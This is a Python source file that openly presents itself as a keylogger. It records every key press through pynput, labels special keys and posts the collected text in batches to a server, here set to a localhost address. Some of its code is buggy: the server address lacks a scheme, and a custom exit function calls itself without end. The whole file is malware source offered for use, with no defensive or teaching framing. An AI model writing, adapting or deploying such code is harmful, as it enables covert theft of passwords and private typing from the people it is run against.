# create a keylogger that sends the log to a remote server
# using the python requests library
# https://requests.readthedocs.io/en/master/
# https://www.youtube.com/watch?v=Jg3iMv5Yd70

# install all the required libraries
# pip install pynput
# pip install requests

# import another python file
import server
import requests
import pynput.keyboard
import threading

# define a global variable to store the log
log = ""

# define a function to send the log to a remote server
def send_log_to_server(log):
    # send the log to a remote server
    # using the requests library
    # https://requests.readthedocs.io/en/master/
    # https://www.youtube.com/watch?v=Jg3iMv5Yd70
    requests.post("127.0.0.1:5000/" + "log", data=log)
    print(log)

# define a function to process the key presses
def process_key_press(key):
    print("Key pressed: " + str(key))
    # convert the key to a string
    key = str(key)

    # check if the key is a special key
    if key == "Key.enter":
        key = " [ENTER] "
    elif key == "Key.backspace":
        key = " [BACKSPACE] "
    elif key == "Key.space":
        key = " "
    elif key == "Key.shift_r":
        key = " [SHIFT] "
    elif key == "Key.shift":
        key = " [SHIFT] "
    elif key == "Key.ctrl_l":
        key = " [CTRL] "
    elif key == "Key.ctrl_r":
        key = " [CTRL] "
    elif key == "Key.alt_l":
        key = " [ALT] "
    elif key == "Key.alt_r":
        key = " [ALT] "
    elif key == "Key.caps_lock":
        key = " [CAPS LOCK] "
    elif key == "Key.tab":
        key = " [TAB] "
    elif key == "Key.cmd":
        key = " [COMMAND] "
    elif key == "Key.delete":
        key = " [DELETE] "
    elif key == "Key.left":
        key = " [LEFT] "
    elif key == "Key.right":
        key = " [RIGHT] "
    elif key == "Key.up":
        key = " [UP] "
    elif key == "Key.down":
        key = " [DOWN] "
    elif key == "Key.page_up":
        key = " [PAGE UP] "
    elif key == "Key.page_down":
        key = " [PAGE DOWN] "
    elif key == "Key.end":
        key = " [END] "
    elif key == "Key.home":
        key = " [HOME] "
    elif key == "Key.print_screen":
        key = " [PRINT SCREEN] "
    elif key == "Key.num_lock":
        key = " [NUM LOCK] "
    elif key == "Key.pause":
        key = " [PAUSE] "
    elif key == "Key.insert":
        key = " [INSERT] "
    elif key == "Key.f1":
        key = " [F1] "
    elif key == "Key.f2":
        key = " [F2] "
    elif key == "Key.f3":
        key = " [F3] "
    elif key == "Key.f4":
        key = " [F4] "
    elif key == "Key.f5":
        key = " [F5] "
    elif key == "Key.f6":
        key = " [F6] "
    elif key == "Key.f7":
        key = " [F7] "
    elif key == "Key.f8":
        key = " [F8] "
    elif key == "Key.f9":
        key = " [F9] "
    elif key == "Key.f10":
        key = " [F10] "
    elif key == "Key.f11":
        key = " [F11] "
    elif key == "Key.f12":
        key = " [F12] "
    elif key == "Key.escape":
        exit()
    
    # add the key to the log
    global log
    log = log + key

    # check if the log is too long
    if len(log) > 100:
        # send the log to a remote server
        send_log_to_server(log)
        # reset the log
        log = ""
        
# define a function to start the keylogger
def start_keylogger():
    # start the keylogger
    with pynput.keyboard.Listener(on_press=process_key_press) as listener:
        listener.join()

# define a function to start the keylogger in a thread
def start_keylogger_thread():
    # start the keylogger in a thread
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

def exit():
    # exit the keylogger
    exit()

# define main function to start and run the keylogger
def main():
    # start the keylogger
    start_keylogger_thread()

# run the main function
if __name__ == "__main__":
    main()
    
